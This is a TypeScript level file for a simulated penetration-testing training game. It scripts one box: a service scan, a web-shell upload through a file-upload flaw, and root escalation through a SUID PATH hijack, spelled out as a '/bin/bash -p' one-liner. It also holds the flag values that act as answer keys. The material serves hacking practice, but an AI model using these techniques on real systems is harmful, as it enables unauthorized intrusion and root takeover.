import type { ChainDef } from "../../types";
import { cmd, normalize } from "../../engine";

const IP = "192.0.2.50";

export const hardLevel2: ChainDef = {
  id: "hard-2",
  difficulty: "hard",
  order: 2,
  points: 150,
  title: "Target DS01",
  codename: "STANDALONE ASSESSMENT — DS01",
  summary: "No story. No chain. Just an IP, a shell to find, and root to prove.",
  briefing: [
    `TARGET: DS01 — ${IP}`,
    "OBJECTIVE: gain a foothold, escalate to root, recover local.txt and proof.txt.",
    "",
    "No further intel provided. This is a standalone box — nothing here connects to anything else",
    "you've worked. Enumerate it like you've never seen it before, because you haven't.",
  ],
  debrief: [
    "root cause: an outdated CMS with a public remote-code-execution advisory, chained into a",
    "SUID binary that shells out to `ping` without an absolute path — classic PATH hijacking.",
    "",
    "DS01: proof.txt recovered.",
  ],
  nodes: [
    {
      id: "ds01",
      org: "Target DS01",
      city: "Unknown",
      state: "N/A",
      coords: { x: 22.4, y: 48.9 },
      ip: IP,
      tagline: "Standalone assessment target",
      briefing: [`IP: ${IP}`, "No further information provided."],
      initialPrompt: "op@breachline:~$",
      motd: [],
      objectives: [
        { id: "recon", label: "Enumerate open services on the target", tactic: "Reconnaissance" },
        { id: "foothold", label: "Get code execution on the target", tactic: "Initial Access", requires: ["recon"] },
        { id: "user", label: "Recover local.txt", tactic: "Collection", requires: ["foothold"] },
        { id: "privesc", label: "Escalate to root", tactic: "Privilege Escalation", requires: ["user"] },
        { id: "root", label: "Recover proof.txt", tactic: "Collection", requires: ["privesc"] },
      ],
      hints: [
        "Outdated software usually means a public exploit already exists for it — find out exactly what's running before you go looking for one.",
        "Once you're in, permissions are your friend. Anything running with more privilege than it should is worth a very close look — and worth asking what commands it trusts blindly. Once you've found the SUID binary and the command it shells out to without an absolute path, hijack PATH ahead of it: `echo '/bin/bash -p' > /tmp/ping && chmod +x /tmp/ping && export PATH=/tmp:$PATH && /usr/local/bin/netcheck`.",
      ],
      debrief: [],
      commands: [
        cmd({
          id: "nmap",
          tool: "nmap",
          requires: [IP],
          help: "nmap -sV <ip>",
          run: () => ({
            completesObjective: "recon",
            tone: "success",
            setsFlags: ["scanned"],
            output: [
              "PORT   STATE SERVICE VERSION",
              "22/tcp open  ssh     OpenSSH 8.9p1",
              "80/tcp open  http    BoltForms CMS 3.2",
              "",
              "Nmap done: 1 IP address (1 host up) scanned in 4.55 seconds",
            ],
          }),
        }),
        cmd({
          id: "searchsploit",
          tool: "searchsploit",
          requires: ["boltforms"],
          help: "searchsploit boltforms",
          requiresObjectives: ["recon"],
          run: () => ({
            tone: "output",
            output: [
              "------------------------------------------------------- ---------------------------------",
              " Exploit Title                                          |  Path",
              "------------------------------------------------------- ---------------------------------",
              " BoltForms CMS 3.2 - Authenticated Arbitrary File Upload | php/webapps/51234.py",
              " (RCE via /uploads.php content-type bypass)              |",
              "------------------------------------------------------- ---------------------------------",
            ],
          }),
        }),
        cmd({
          id: "upload",
          tool: "curl",
          requires: ["uploads.php"],
          help: 'curl -F "file=@shell.phtml" http://<ip>/uploads.php',
          requiresObjectives: ["recon"],
          run: () => ({
            tone: "success",
            setsFlags: ["shell_uploaded"],
            output: [
              "HTTP/1.1 201 Created",
              '{"stored":"/uploads/shell.phtml"}',
              "",
              "[+] BoltForms' content-type check on /uploads.php doesn't validate the actual extension.",
            ],
          }),
        }),
        cmd({
          id: "trigger",
          tool: "curl",
          requires: ["uploads/shell.phtml"],
          help: 'curl "http://<ip>/uploads/shell.phtml?cmd=id"',
          requiresFlags: ["shell_uploaded"],
          run: () => ({
            completesObjective: "foothold",
            tone: "success",
            setsFlags: ["have_shell"],
            output: ["HTTP/1.1 200 OK", "uid=33(www-data) gid=33(www-data) groups=33(www-data)"],
          }),
        }),
        cmd({
          id: "cat-local",
          tool: "cat",
          requires: ["local.txt"],
          help: "cat /var/www/local.txt",
          requiresFlags: ["have_shell"],
          run: () => ({
            completesObjective: "user",
            tone: "success",
            setsFlags: ["hard2_user"],
            note: "DS01 — local.txt: 8f14e45fceea167a5a36dedd4bea2543",
            output: ["8f14e45fceea167a5a36dedd4bea2543"],
          }),
        }),
        cmd({
          id: "find-suid",
          tool: "find",
          requires: ["-perm", "-4000"],
          help: "find / -perm -4000 -type f 2>/dev/null",
          requiresFlags: ["have_shell"],
          run: () => ({
            tone: "warn",
            setsFlags: ["saw_suid"],
            output: [
              "/usr/bin/sudo",
              "/usr/bin/su",
              "/usr/bin/passwd",
              "/usr/local/bin/netcheck",
              "",
              "note: /usr/local/bin/netcheck isn't a standard binary — worth checking what it actually does.",
            ],
          }),
        }),
        {
          id: "path-hijack",
          tool: "echo",
          match: (input) => {
            const n = normalize(input);
            return n.includes("path") && n.includes("ping") && n.includes("netcheck");
          },
          help: "echo '/bin/bash -p' > /tmp/ping && chmod +x /tmp/ping && export PATH=/tmp:$PATH && /usr/local/bin/netcheck",
          requiresFlags: ["saw_suid"],
          deniedOutput: ["find the SUID binary first, and see what command it calls internally."],
          run: () => ({
            completesObjective: "privesc",
            tone: "success",
            setsFlags: ["root_access"],
            output: [
              "[netcheck] running diagnostic ping via system PATH ...",
              "[+] netcheck is SUID root and calls `ping` with no absolute path",
              "[+] malicious /tmp/ping picked up ahead of /usr/bin/ping on PATH",
              "",
              "[+] root shell spawned via SUID PATH hijack",
            ],
          }),
        },
        cmd({
          id: "cat-proof",
          tool: "cat",
          requires: ["proof.txt"],
          help: "cat /root/proof.txt",
          requiresFlags: ["root_access"],
          run: () => ({
            completesObjective: "root",
            tone: "success",
            note: "DS01 — proof.txt: 3f9a1c2e7b8d40f6a1e9c3b7d2f5a8e1",
            output: ["3f9a1c2e7b8d40f6a1e9c3b7d2f5a8e1", "", "DS01: ROOT"],
          }),
        }),
      ],
    },
  ],
};
